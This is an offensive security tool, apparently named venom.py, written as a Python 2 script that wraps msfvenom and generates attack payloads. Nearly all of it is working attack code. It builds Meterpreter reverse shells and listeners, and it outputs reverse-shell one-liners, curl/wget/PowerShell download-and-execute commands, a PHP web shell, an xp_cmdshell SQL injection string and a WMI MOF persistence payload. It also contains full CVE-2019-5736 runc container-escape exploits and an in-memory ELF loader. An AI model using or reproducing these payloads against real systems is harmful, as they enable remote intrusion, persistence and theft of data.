#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#▌ ▐·▄▄▄ . ▐ ▄       • ▌ ▄ ·.                                                                               #
#▪█·█▌▀▄.▀·•█▌▐█▪     ·██ ▐███▪                                                                             #
#▐█▐█•▐▀▀▪▄▐█▐▐▌ ▄█▀▄ ▐█ ▌▐▌▐█·                                                                             #
#███ ▐█▄▄▌██▐█▌▐█▌.▐▌██ ██▌▐█▌                                                                              #
#. ▀   ▀▀▀ ▀▀ █▪ ▀█▄▀▪▀▀  █▪▀▀▀                                                                             #
#                                                                                                           #
# venom.py - nighter@nighter.se                                                                             #
#                                                                                                           #
# DATE                                                                                                      #
# 14/06/2018                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
#  Just a wrapper around msvenom to simplify payload creation                                               #
#                                                                                                           #
# nighter - nighter@nighter.se                                                                              #
#                                                                                                           #
#############################################################################################################

import random
import getpass
import signal
import time
import sys
import os
import termios
import select
import socket
import fcntl
import argparse
import base64
import binascii
import urllib as ul
import netifaces as ni

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


class PTY:
    def __init__(self, slave=0, pid=os.getpid()):
        # apparently python GC's modules before class instances so, here
        # we have some hax to ensure we can restore the terminal state.
        self.termios, self.fcntl = termios, fcntl

        # open our controlling PTY
        self.pty  = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+")

        # store our old termios settings so we can restore after
        # we are finished
        self.oldtermios = termios.tcgetattr(self.pty)

        # get the current settings se we can modify them
        newattr = termios.tcgetattr(self.pty)

        # set the terminal to uncanonical mode and turn off
        # input echo.
        newattr[3] &= ~termios.ICANON & ~termios.ECHO

        # don't handle ^C / ^Z / ^\
        newattr[6][termios.VINTR] = '\x00'
        newattr[6][termios.VQUIT] = '\x00'
        newattr[6][termios.VSUSP] = '\x00'

        # set our new attributes
        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        # store the old fcntl flags
        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        # fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
        # make the PTY non-blocking
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)

    def write(self, data):
        ret = self.pty.write(data)
        self.pty.flush()
        return ret

    def fileno(self):
        return self.pty.fileno()

    def __del__(self):
        # restore the terminal settings on deletion
        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)


class Shell:
    def __init__(self, addr, bind=True):
        self.bind = bind
        self.addr = addr

        if self.bind:
            self.sock = socket.socket()
            self.sock.bind(self.addr)
            self.sock.listen(5)

    def handle(self, addr=None):
        addr = addr or self.addr
        if self.bind:
            sock, addr = self.sock.accept()
        else:
            sock = socket.socket()
            sock.connect(addr)

        # create our PTY
        pty = PTY()

        # input buffers for the fd's
        buffers = [ [ sock, [] ], [ pty, [] ] ]
        def buffer_index(fd):
            for index, buffer in enumerate(buffers):
                if buffer[0] == fd:
                    return index

        readable_fds = [ sock, pty ]

        data = " "
        # keep going until something deds
        while data:
            # if any of the fd's need to be written to, add them to the
            # writable_fds
            writable_fds = []
            for buffer in buffers:
                if buffer[1]:
                    writable_fds.append(buffer[0])

            r, w, x = select.select(readable_fds, writable_fds, [])

            # read from the fd's and store their input in the other fd's buffer
            for fd in r:
                buffer = buffers[buffer_index(fd) ^ 1][1]
                if hasattr(fd, "read"):
                    data = fd.read(8192)
                else:
                    data = fd.recv(8192)
                if data:
                    buffer.append(data)

            # send data from each buffer onto the proper FD
            for fd in w:
                buffer = buffers[buffer_index(fd)][1]
                data = buffer[0]
                if hasattr(fd, "write"):
                    fd.write(data)
                else:
                    fd.send(data)
                buffer.remove(data)

        # close the socket
        sock.close()


def create_perl_mem_payload(type):

    if os.path.isfile('%s_payload' % type) is False:
        print("Missing payload file")
        return False

    payload_file = '%s_payload' % type
    perl_payload_file = '%s_payload.pl' % type

    payload = '''#!/usr/bin/env perl
use warnings;
use strict;
$|=1;
my $name = "";
my $fd = syscall(319, $name, 1);
if (-1 == $fd) {
   die "memfd_create: $!";
}
print "fd $fd\\n";
open(my $FH, '>&='.$fd) or die "open: $!";
select((select($FH), $|=1)[0]);
'''
    with open(perl_payload_file, 'w') as f:
        f.write(payload)

    command = '''perl -e '$/=\\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \\$!/;\\n"while(<>)' %s >> %s''' % (payload_file, perl_payload_file)
    os.system(command)

    payload = '''exec {"/proc/$$/fd/$fd"} "%s" or die "exec: $!";''' % payload_file
    with open(perl_payload_file, 'a') as f:
        f.write(payload)

    print("[+] Saved %s" % perl_payload_file)

def msfvenom(type, lhost, lport):

    if type == 'win64':
        command = "msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_payload" % (lhost, lport, type)
    elif type == 'win32':
        command = "msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_payload" % (lhost, lport, type)
    elif type == 'lin64' or type == 'mperl64':
        command = "msfvenom --platform linux -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_payload" % (lhost, lport, type)
    elif type == 'lin32' or type == 'mperl32':
        command = "msfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_payload" % (lhost, lport, type)
    else:
        print_usage()

    os.system(command)
    print("[+] Saved %s_payload" % type)

    if type == 'mperl64' or type == 'mperl32':
        create_perl_mem_payload(type)


def listener(type, lhost, lport):

    payload = "use exploit/multi/handler\n"

    if type == 'win64s':
        payload += "set PAYLOAD windows/x64/meterpreter/reverse_tcp\n"
    elif type == 'win32s':
        payload += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
    elif type == 'lin64s':
        payload += "set PAYLOAD linux/x64/meterpreter/reverse_tcp\n"
    elif type == 'lin32s':
        payload += "set PAYLOAD linux/x86/meterpreter/reverse_tcp\n"
    else:
        print_usage()

    payload += "set LHOST %s\n" % lhost
    payload += "set LPORT %s\n" % lport
    payload += "set ExitOnSession false\n"
    payload += "exploit -j -z\n"

    with open('/tmp/meterpreter.rc', 'w') as file:
        file.write(payload)

    command = "msfconsole -r /tmp/meterpreter.rc"
    os.system(command)

def build_mysql_payload(lhost, lport):

    if os.path.isfile('/usr/bin/go') is False:
        print("go is required to compile this payload")
        sys.exit(0)

    username = raw_input("username> ")
    password = raw_input("password> ")

    if len(password) == 0 or len(username) == 0:
        print("Credentials is required for mysql payload")
        sys.exit(0)

    payload ='''package main

import (
    "github.com/ThomasRooney/gexpect"
    "fmt"
    "os"
)

func main() {

    child, err := gexpect.Spawn("mysql -u %s -p%s")''' % (username, password)
    payload += '''

    if err != nil {
        panic(err)
    }

    match, _ := child.ExpectRegexFind(".*[m|M][y|Y][s|S][q|Q][l|L].*")

    if len(match) == 0 {
        fmt.Println("Wrong credentials.")
        child.Close()
        os.Exit(3)
    }
'''
    payload += '''child.SendLine("\\\! python -c 'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\"%s\\", %s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\"/bin/bash\\");s.close()'")''' % (lhost, lport)
    payload += '''
    child.Interact()
    child.Close()
}'''

    with open('/tmp/mysql_x64.go', 'w') as f:
        f.write(payload)

    print("Created mysql_x64")
    os.system('go build -o ./mysql_x64 /tmp/mysql_x64.go')


def build_mof(lhost, lport):
    mof_skeleton = """#pragma namespace ("\\\\\\\\.\\\\Root\\\\cimv2")

    class MSClassConsumer71
    {
      [key] string Name;
    };

    class ActiveScriptEventConsumer : __EventConsumer
    {
      [key] string Name;
      [not_null] string ScriptingEngine;
      [Template] string ScriptText;
      string ScriptFilename;
      uint32 KillTimeout = 0;
    };

    instance of __Win32Provider as $P
    {
      Name = "ActiveScriptEventConsumer";
      Clsid = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
      PerUserInitialization = TRUE;
    };

    instance of __EventConsumerProviderRegistration
    {
      Provider = $P;
      ConsumerClassNames = {"ActiveScriptEventConsumer"};
    };

    instance of ActiveScriptEventConsumer as $Cons
    {
      Name = "ACEVNTBX";
      ScriptingEngine = "VBScript";
      ScriptText = "Set objShell = CreateObject(\\"WScript.Shell\\")\\n"
      "objShell.Run \\"C:\\\\Windows\\\\system32\\\\cmd.exe /C C:\\\\Windows\\\\system32\\\\nc.exe ###LHOST### ###LPORT### -e C:\\\\Windows\\\\system32\\\\cmd.exe\\"\\n";
    };

    instance of __EventFilter as $Filt
    {
      Name = "IEFLTKC";
      Query = "SELECT * FROM __InstanceCreationEvent"
        " WHERE TargetInstance.__class = \\"MSClassConsumer71\\"";
      QueryLanguage = "WQL";
    };

    instance of __FilterToConsumerBinding as $bind
    {
        Filter = $Filt;
        Consumer = $Cons;
    };


    instance of MSClassConsumer71 as $myclass
    {
      Name = "ClassConsumer81";
    };"""

    mof_name = 'payload.mof'
    print('[+] Generating {}'.format(mof_name))

    mof_filled = mof_skeleton.replace('###LHOST###', lhost)
    mof_filled = mof_filled.replace('###LPORT###', lport)

    mof_lfile_path = './{}'.format(mof_name)
    try:
        with open(mof_lfile_path, 'w') as mof_file:
            mof_file.write(mof_filled)
    except IOError as e:
        print('[-] An error occured while writing the mof file. Printing exception and exiting...')
        print(e)
        sys.exit(1)

    return mof_name


def build_dockerp(lhost, lport):

    payload = '''#!/usr/bin/env python2
import os
import stat
host='%s'
port='%s'
''' % (lhost, lport)

    payload += '''payload='#!/bin/bash\\necho "exec 5<>/dev/tcp/%s/%s && cat <&5|/bin/bash 2>&5 >&5"|/bin/bash\\n' % (host, port)
target_file='/bin/sh'

if __name__ == '__main__':

  with open(target_file,'w') as evil:
    evil.write('#!/proc/self/exe --criu')
    os.chmod(target_file,stat.S_IXOTH)

  found = 0
  while found == 0:
    procs = os.popen('ps -A -o pid')
    for pid in procs:
      pid = pid.strip()
      if pid == 'PID': continue
      if int(pid) > os.getpid():
        try:
          with open('/proc/%s/cmdline' % pid,'r') as cmdline:
            if cmdline.read().find('runc') >= 0:
              found = pid
        except FileNotFoundError:
          continue
        except ProcessLookupError:
          continue

  handle = -1
  while handle == -1:
    try:
      handle = os.open('/proc/%s/exe' % found, os.O_PATH)
    except FileNotFoundError:
      continue
    except PermissionError:
      continue
  print('Got file handle')
  write_handle = 0;
  while write_handle == 0:
    try:
      write_handle = os.open('/proc/self/fd/%s' % str(handle),os.O_WRONLY|os.O_TRUNC)
    except OSError:
      continue
  print('Got write handle')
  result = os.write(write_handle,str.encode(payload))
  if result == len(payload):
    print('Successfully wrote payload')
  else:
    print('Could not write')
    '''

    with open('cve-2019-5736.py', 'w') as f:
        f.write(payload)
    print('[+] Saved: cve-2019-5736.py')


def build_dockerb(lhost, lport):

    payload = '''package main
import (
    "fmt"
    "io/ioutil"
    "os"
    "strconv"
    "strings"
)

var payload = "#!/bin/bash\\necho 'exec 5<>/dev/tcp/%s/%s && cat <&5|/bin/bash 2>&5 >&5'|/bin/bash\\n" 
''' % (lhost, lport)

    payload += '''
func main() {
    fd, err := os.Create("/bin/sh")
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Fprintln(fd, "#!/proc/self/exe")
    err = fd.Close()
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Println("[+] Overwritten /bin/sh successfully")

    var found int
    for found == 0 {
        pids, err := ioutil.ReadDir("/proc")
        if err != nil {
            fmt.Println(err)
            return
        }
        for _, f := range pids {
            fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
            fstring := string(fbytes)
            if strings.Contains(fstring, "runc") {
                fmt.Println("[+] Found the PID:", f.Name())
                found, err = strconv.Atoi(f.Name())
                if err != nil {
                    fmt.Println(err)
                    return
                }
            }
        }
    }

    var handleFd = -1
    for handleFd == -1 {
        // Note, you do not need to use the O_PATH flag for the exploit to work.
        handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
        if int(handle.Fd()) > 0 {
            handleFd = int(handle.Fd())
        }
    }
    fmt.Println("[+] Successfully got the file handle")

    for {
        writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
        if int(writeHandle.Fd()) > 0 {
            fmt.Println("[+] Successfully got write handle", writeHandle)
            writeHandle.Write([]byte(payload))
            return
        }
    }
}'''

    with open('/tmp/cve-2019-5736.go', 'w') as f:
        f.write(payload)
    print('[+] Saved: /tmp/cve-2019-5736.go')

    print('[+] Compile: /tmp/cve-2019-5736.go')
    os.system('go build /tmp/cve-2019-5736.go')
    print('[+] Saved: cve-2019-5736')


def python_reverse_shell(lhost,lport, ver=''):
    python_rev_shell = '''python%s -c \'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
  s.connect(("%s", %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()\'''' % (ver, lhost, lport)

    _encoded = base64.b64encode(python_rev_shell)
    return 'echo %s|base64 -d|bash' % _encoded


def print_usage():
    print ("""
 ▌ ▐·▄▄▄ . ▐ ▄       • ▌ ▄ ·.
▪█·█▌▀▄.▀·•█▌▐█▪     ·██ ▐███▪
▐█▐█•▐▀▀▪▄▐█▐▐▌ ▄█▀▄ ▐█ ▌▐▌▐█·
 ███ ▐█▄▄▌██▐█▌▐█▌.▐▌██ ██▌▐█▌
. ▀   ▀▀▀ ▀▀ █▪ ▀█▄▀▪▀▀  █▪▀▀▀
Simplifies payload creation and listener.

  <~~~~~~~~~~~~~~~~~~~~~~~[Payloads]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    win64    <LHOST> <LPORT>  |   x64 Windows payload
    win32    <LHOST> <LPORT>  |   x32 Windows payload
    lin64    <LHOST> <LPORT>  |   x64 Linux payload
    lin32    <LHOST> <LPORT>  |   x32 Linux payload
    mysql64  <LHOST> <LPORT>  |   x64 Linux mysql payload
    mofnc    <LHOST> <LPORT>  |   netcat reverse_tcp mof payload
    dockerpy <LHOST> <LPORT>  |   cve-2019-5736 docker payload 
    dockerb  <LHOST> <LPORT>  |   cve-2019-5736 docker compiled payload 
                              |
  <~~~~~~~~~~~~~~~~~~~~~~~[Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    python   <LHOST> <LPORT>  |   python reverse_tcp payload
    python2  <LHOST> <LPORT>  |   python2 reverse_tcp payload
    python3  <LHOST> <LPORT>  |   python3 reverse_tcp payload
    bash     <LHOST> <LPORT>  |   bash reverse_tcp payload
    ncbash   <LHOST> <LPORT>  |   nc bash combined reverse_tcp payload
    b64py    <LHOST> <LPORT>  |   base64 encoded python payload
    b64py2   <LHOST> <LPORT>  |   base64 encoded python2 payload
    b64py3   <LHOST> <LPORT>  |   base64 encoded python3 payload
    nc       <LHOST> <LPORT>  |   np reverse_tcp payload
    curlrun  <LHOST> <LPORT>  |   Curl download pipe to bash
    curlrunp <LHOST> <LPORT>  |   Curl download and pipe to perl
    wgetrun  <LHOST> <LPORT>  |   Wget download pipe to bash
    wgetrunp <LHOST> <LPORT>  |   Wget download pipe to perl
  <~~~~~~~~~~~~~~~~~~~~~~~[Win Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    winhttp  <LHOST> <LPORT>  |    windows download and execute
    windl    <LHOST> <LPORT>  |    windows download file
    wincert  <LHOST> <LPORT>  |    windows download file with certutil
    winup    <LHOST> <LPORT>  |    windows webdav file upload
    ftpdl    <LHOST> <LPORT>  |    windows FTP download 
    winwget  <LHOST> <LPORT>  |    windows wget download
                              |
  <~~~~~~~~~~~~~~~~~~~~~[PHP Shells]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              | 
    phpcmd                    |    Standard PHP Shell
    phprev   <LHOST> <LPORT>  |    PHP reverse shell
                              |
  <~~~~~~~~~~~~~~~~~~~~~[Payloads SQLI]~~~~~~~~~~~~~~~~~~~~~~~~~~~~>  
                              |
    xpcmdi   exec <COMMAND>   |    Output xp_cmdshell sqli payload
                              |
  <~~~~~~~~~~~~~~~~~~~~~~~[Listen]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    win64s   <LHOST> <LPORT>  |   x64 Windows meterpreter listen
    win32s   <LHOST> <LPORT>  |   x32 Windows meterpreter listen
    lin64s   <LHOST> <LPORT>  |   x64 Linux meterpreter listen
    lin32s   <LHOST> <LPORT>  |   x32 Linux meterpreter listen
    pythons  <LHOST> <LPORT>  |   python listener
    ncs      <LHOST> <LPORT>  |   netcat listener
                              |
  <~~~~~~~~~~~~~~~~~~~~~~~[Advanced]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    mperl64  <LHOST> <LPORT>  |   x64 Linux elf memory inject binary
    mperl32  <LHOST> <LPORT>  |   x32 Linux elf memory inject binary
                              |
  <~~~~~~~~~~~~~~~~~~~~~~~~[Misc]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                              |
    httpsrv  <HOST>  <PORT>   |  Http server listen in current dir
    phpsrv   <HOST>  <PORT>   |  Php server listen in current dir
                              |
  <~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>

    """)

    sys.exit(0)

if __name__ == '__main__':

    try:
        if sys.argv[1] == 'phpcmd':
            print("")
            print('<?php echo system($_REQUEST["cmd"]); ?>')
            print("")
            os._exit(0)
    except:
        pass

    if len(sys.argv) <= 3:
        print_usage()

    type = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]

    try:
        socket.inet_aton(lhost)
    except socket.error:
        try:
            ni.ifaddresses(lhost)
            lhost = ni.ifaddresses(lhost)[ni.AF_INET][0]['addr']
        except:
            print('[-] No such interface: %s' % lhost)
            sys.exit(1)

    if type == 'xpcmdi':
        _command = "0x%s" % binascii.hexlify(lport)
        data = "';DECLARE @bzfp VARCHAR(8000);SET @bzfp=%s;EXEC master..xp_cmdshell @bzfp--" % _command
        print('')
        print(ul.quote_plus(data).replace('+', '%20'))
        print('')
        sys.exit(0)

    if type == 'b64py':
        print(python_reverse_shell(lhost, lport, ver=''))
        sys.exit(0)

    if type == 'b64py2':
        print(python_reverse_shell(lhost, lport, ver='2'))
        sys.exit(0)

    if type == 'b64py3':
        print(python_reverse_shell(lhost, lport, ver='3'))
        sys.exit(0)

    if type == 'httpsrv':

        if int(lport) < 1025:
            os.system("sudo python -m http.server --bind %s %s" % (lhost, lport))
            sys.exit(0)

        os.system("python -m http.server --bind %s %s" % (lhost, lport))
        sys.exit(0)

    if type == 'phpsrv':

        if int(lport) < 1025:
            os.system("sudo php -S %s:%s" % (lhost, lport))
            sys.exit(0)

        os.system("php -S %s:%s" % (lhost, lport))
        sys.exit(0)

    if type == 'phprev':

        _payload = '''php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");\'''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'winhttp':

        try:
            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
        except:
            file = 'shell.ps1'

        _payload = '''powershell "IEX(New-Object Net.WebClient).downloadString('http://%s:%s/%s')"''' % (lhost, lport, file)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'ftpdl':

        try:
            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
        except:
            file = 'nc.exe'

        _payload = '''
python3 -m pyftpdlib -p %s 
----------------------------------
echo open %s %s> ftp.txt
echo USER anonymous>> ftp.txt
echo password>> ftp.txt
echo bin >> ftp.txt
echo GET %s >> ftp.txt
echo bye >> ftp.txt
---------------------------------
ftp -v -n -s:ftp.txt
''' % (lport, lhost, lport, file)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'winwget':

        try:
            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
        except:
            file = 'nc.exe'

        _payload = '''
--------------------------------------------------------------------------------------
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
---------------------------------------------------------------------------------------
cscript wget.vbs http://%s:%s/%s %s
    ''' % (lhost, lport, file, file)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'windl':

        try:
            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
        except:
            file = 'shell.ps1'

        _payload = '''powershell -command "& { iwr http://%s:%s/%s -OutFile %s }"''' % (lhost, lport, file, file)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'wincert':

        try:
            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
        except:
            file = 'payload.exe'

        _payload = '''certutil.exe -urlcache -split -f http://%s:%s/%s''' % (lhost, lport, file)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'winup':

        try:
            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
        except:
            file = 'payload.exe'

        _payload = '''powershell "$WebClient = New-Object System.Net.WebClient;$WebClient.UploadFile('http://%s:%s/%s', 'PUT', 'c:\\%s')"''' % (lhost, lport, file, file)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'curlrun':

        try:
            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
        except:
            file = 'payload.sh'

        _payload = '''curl -s https://%s:%s/%s|bash  ''' % (lhost, lport, file)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'curlrunp':

        try:
            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
        except:
            file = 'payload.pl'

        _payload = '''curl -s https://%s:%s/%s|perl  ''' % (lhost, lport, file)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'wgetrun':

        try:
            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
        except:
            file = 'payload.sh'

        _payload = '''wget -q -O - https://%s:%s/%s|bash  ''' % (lhost, lport, file)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'wgetrunp':

        try:
            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
        except:
            file = 'payload.pl'

        _payload = '''wget -q -O - https://%s:%s/%s|perl  ''' % (lhost, lport, file)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'python':
        _payload = '''python -c 'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("%s", %s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()' ''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'python2':
        _payload = '''python2 -c 'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("%s", %s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()' ''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'python3':
        _payload = '''python3 -c 'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("%s", %s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()' ''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'bash':
        _payload = '''bash -i >& /dev/tcp/%s/%s 0>&1''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'nc':
        _payload = '''nc -e /bin/sh %s %s''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'ncbash':
        _payload = '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f''' % (lhost, lport)
        print('')
        print(_payload)
        print('')
        sys.exit(0)

    if type == 'pythons':
        # Start listener
        s = Shell((lhost, int(lport)), bind=True)
        print("Waiting for connection on %s:%s" %(lhost, lport))
        s.handle()
        sys.exit(0)

    if type == 'ncs':
        os.system('nc -l %s -nvvp %s' % (lhost, lport))
        sys.exit(0)

    if type == 'mysql64':
        build_mysql_payload(lhost, lport)
        sys.exit(0)

    if type == 'mofnc':
        build_mof(lhost, lport)
        sys.exit(0)

    if type == 'dockerpy':
        build_dockerp(lhost, lport)
        sys.exit(0)

    if type == 'dockerb':
        build_dockerb(lhost, lport)
        sys.exit(0)

    if type[-1] == 's':
       listener(type, lhost, lport)
       sys.exit(0)

    msfvenom(type, lhost, lport)
